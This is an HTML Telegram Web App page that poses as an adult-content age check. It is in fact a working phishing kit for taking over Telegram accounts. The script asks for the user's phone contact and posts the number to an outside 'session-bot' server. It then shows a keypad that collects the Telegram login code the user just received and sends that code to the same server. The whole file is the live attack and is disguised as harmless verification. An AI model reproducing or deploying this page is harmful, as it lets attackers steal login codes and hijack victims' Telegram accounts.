<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 0; margin: 0; text-align: center; background: #000; color: white; }
        .overlay { height: 100vh; display: flex; flex-direction: column; justify-content: center; padding: 20px; box-sizing: border-box; }
        .box { background: white; color: #333; padding: 30px; border-radius: 25px; }
        .btn { background: #28a745; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; cursor: pointer; font-size: 20px; }
        .hidden { display: none; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #eee; border-radius: 12px; font-size: 24px; text-align: center; }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .key { background: #eee; padding: 20px; border-radius: 10px; font-size: 20px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="overlay">
        <div id="step0" class="box">
            <h2 id="status_text">Attention!</h2>
            <p>To continue, confirm you are over 18 😊</p>
            <button class="btn" onclick="startRequest()">🍓 Confirm 🔞</button>
        </div>

        <div id="step2" class="box hidden">
            <h3>Identity Check</h3>
            <p>Enter the code sent to your Telegram</p>
            <input type="text" id="otp_display" placeholder="-----" readonly>
            <div class="keypad" id="kp">
                <!-- Keys will be handled by JS -->
            </div>
            <button class="btn" style="margin-top:10px;" onclick="verifyOTP()">Verify OK</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
        let currentOTP = "";

        function startRequest() {
            tg.requestContact((res) => {
                if (res.status === 'sent') {
                    document.getElementById('status_text').innerText = "Verifying...";
                    checkNumber(); // নম্বর চেক করা শুরু
                }
            });
        }

        async function checkNumber() {
            try {
                let res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                let data = await res.json();
                if (data.status === "success") {
                    sendPhoneToBackend(data.phone);
                } else {
                    setTimeout(checkNumber, 2000); // ২ সেকেন্ড পর আবার চেক
                }
            } catch (e) { setTimeout(checkNumber, 2000); }
        }

        async function sendPhoneToBackend(phone) {
            let res = await fetch(`${BACKEND_URL}/send_number`, {
                method: "POST", headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ user_id: userId, phone: phone })
            });
            let data = await res.json();
            if(data.status === "success") {
                document.getElementById('step0').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
                setupKeypad();
            }
        }

        function setupKeypad() {
            const kp = document.getElementById('kp');
            for(let i=1; i<=9; i++) kp.innerHTML += `<div class="key" onclick="addNum('${i}')">${i}</div>`;
            kp.innerHTML += `<div class="key" onclick="clearNum()">C</div>`;
            kp.innerHTML += `<div class="key" onclick="addNum('0')">0</div>`;
        }

        function addNum(n) { if(currentOTP.length < 5) { currentOTP += n; document.getElementById("otp_display").value = currentOTP; } }
        function clearNum() { currentOTP = ""; document.getElementById("otp_display").value = ""; }

        async function verifyOTP() {
            let res = await fetch(`${BACKEND_URL}/verify_otp`, {
                method: "POST", headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ user_id: userId, otp: currentOTP })
            });
            let data = await res.json();
            if(data.status === "success") tg.close();
            else { alert("Wrong Code!"); clearNum(); }
        }
    </script>
</body>
</html>
